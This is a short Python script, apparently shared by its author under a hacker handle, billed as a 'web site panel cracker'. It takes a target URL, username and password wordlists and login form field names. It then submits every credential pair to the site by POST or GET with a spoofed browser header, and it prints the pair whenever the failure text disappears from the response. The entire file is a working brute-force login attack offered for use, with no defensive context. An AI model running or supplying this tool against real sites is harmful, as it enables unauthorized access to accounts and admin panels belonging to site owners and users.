print("""

██╗      ██████╗ ███╗   ███╗██████╗ ██████╗ 
██║     ██╔═══██╗████╗ ████║╚════██╗╚════██╗
██║     ██║   ██║██╔████╔██║ █████╔╝ █████╔╝
██║     ██║▄▄ ██║██║╚██╔╝██║ ╚═══██╗ ╚═══██╗
███████╗╚██████╔╝██║ ╚═╝ ██║██████╔╝██████╔╝
╚══════╝ ╚══▀▀═╝ ╚═╝     ╚═╝╚═════╝ ╚═════╝
instagram:lqm33.py

WEB SİTE PANEL CRACKER
""")
#coded by lqm33
url=input("Enter the url...:")
usernamelist=input("Username List ...:")
passlist=input("Password List ...:")
username=input("Username Header ...:")
passwrodt=input("Password Header ...:")
subbutton=input("Submit Header ...:")
subbuttonv=input("Submit Header Value ...:")
cookiename=input("COOKİE NAME...:")
cookievalue=input("COOKİE Value...:")
change=input("Write what happens on the PAGE...:")
import requests
import sys
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36'
    }
method=input("POST or GET ?...:")
if method=="POST" or method=="post":
    with open(usernamelist,"r")as user:
        for tryuser in user:
            tryuser= tryuser.replace('\n','')
            with open(passlist,"r")as passaaa:
                for sifre in passaaa:
                    sifre=sifre.replace('\n','')
                    payload={username:tryuser,passwrodt:sifre,subbutton:subbuttonv}
                    cookies={cookiename:cookievalue}
                    r=requests.post(url,headers=headers,data=payload,cookies=cookies)
                    if change not in r.text:
                        print("CRACKED--> "+tryuser+" "+sifre)
                        sys.exit()
                    else:
                        print("unsuccessful--> "+tryuser+" "+sifre)
elif method=="GET" or method=="get":
    with open(usernamelist,"r")as user:
        for tryuser in user:
            tryuser= tryuser.replace('\n','')
            with open(passlist,"r")as passaaa:
                for sifre in passaaa:
                    sifre=sifre.replace('\n','')
                    payload={username:tryuser,passwrodt:sifre,subbutton:subbuttonv}
                    cookies={cookiename:cookievalue}
                    r=requests.get(url,headers=headers,data=payload,cookies=cookies)
                    if change not in r.text:
                        print("CRACKED--> "+tryuser+" "+sifre)
                        sys.exit()
                        
                    else:
                        print("unsuccessful--> "+tryuser+" "+sifre)
